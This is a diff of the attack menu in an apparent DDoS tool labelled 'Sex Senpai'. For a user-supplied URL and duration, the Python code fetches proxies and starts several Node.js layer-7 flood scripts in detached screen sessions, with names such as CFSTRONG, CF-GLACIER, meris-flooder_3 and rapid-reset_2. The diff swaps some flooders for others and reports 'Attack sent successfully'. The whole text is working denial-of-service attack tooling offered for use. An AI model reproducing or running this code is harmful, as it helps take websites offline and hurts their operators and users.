@@ -680,37 +680,11 @@ Sex Senpai •~•
 				try:
 					url = str(input(f"{Color.LG} [>] URL: "+Color.RESET))
 					floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
-					F_Tool.getproxies();subprocess.run([f'screen -dm node utils/L7/CFSTRONG {url} {floodtime} 15 GET utils/proxy.txt 512'], shell=True)
-					F_Tool.getproxies();subprocess.run([f'screen -dm node utils/L7/CFSockets {url} {floodtime}'], shell=True)
-					F_Tool.getproxies();subprocess.run([f'screen -dm node utils/L7/paradox-tls GET {url} utils/http.txt {floodtime} 512 15'], shell=True)
 					F_Tool.getproxies();subprocess.run([f'screen -dm node utils/L7/https2 {url} {floodtime} 1'], shell=True)
 					F_Tool.getproxies();subprocess.run([f'screen -dm node utils/L7/https1 GET {url} utils/http.txt {floodtime} 64 1'], shell=True)
-					F_Tool.getproxies();subprocess.run([f'screen -dm node utils/L7/CF-GLACIER GET {url} utils/http.txt {floodtime} 850 15'], shell=True)
-					print(Color.LG+f"\n [!] Attack sent successfully!\n")
-				except:
-					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
-			elif option in ['02', '2']:
-				try:
-					url = str(input(f"{Color.LG} [>] URL: "+Color.RESET))
-					floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
-					F_Tool.getproxies();subprocess.run([f'screen -dm node utils/L7/force GET 15 {url} utils/http.txt {floodtime} 512'], shell=True)
-					F_Tool.getproxies();subprocess.run([f'screen -dm node utils/L7/bypass {url} {floodtime}'], shell=True)
-					F_Tool.getproxies();subprocess.run([f'screen -dm node utils/L7/FUKU {url} {floodtime} 512 15 utils/http.txt'], shell=True)
-					F_Tool.getproxies();subprocess.run([f'screen -dm node utils/L7/Zeus-Lord {url} {floodtime} 850 15 utils/http.txt'], shell=True)
-					F_Tool.getproxies();subprocess.run([f'screen -dm node utils/L7/Murder {url} {floodtime} 15 utils/http.txt 512'], shell=True)
+					F_Tool.getproxies();subprocess.run([f'screen -dm node utils/L7/meris-flooder_3 {url} {floodtime} 512 10 GET utils/http.txt'], shell=True)
+					F_Tool.getproxies();subprocess.run([f'screen -dm node utils/L7/rapid-reset_2 {url} {floodtime} 512 10 GET utils/http.txt'], shell=True)
 					
-					print(Color.LG+f"\n [!] Attack sent successfully!\n")
-				except:
-					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
-			elif option in ['03', '3']:
-				try:
-					url = str(input(f"{Color.LG} [>] URL: "+Color.RESET))
-					floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
-					reqs = int(input(f"{Color.LG} [>] Reqs(200): "+Color.RESET))
-					F_Tool.getproxies();subprocess.run([f'screen -dm node utils/L7/socket {url} utils/http.txt {floodtime} {reqs}'], shell=True)
-					F_Tool.getproxies();subprocess.run([f'screen -dm node utils/L7/https2 {url} {floodtime} 1'], shell=True)
-					F_Tool.getproxies();subprocess.run([f'screen -dm node utils/L7/https1 GET {url} utils/http.txt {floodtime} 64 1'], shell=True)
-					F_Tool.getproxies();subprocess.run([f'screen -dm node utils/L7/socket {url} utils/http.txt {floodtime} {reqs}'], shell=True)
 					print(Color.LG+f"\n [!] Attack sent successfully!\n")
 				except:
 					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
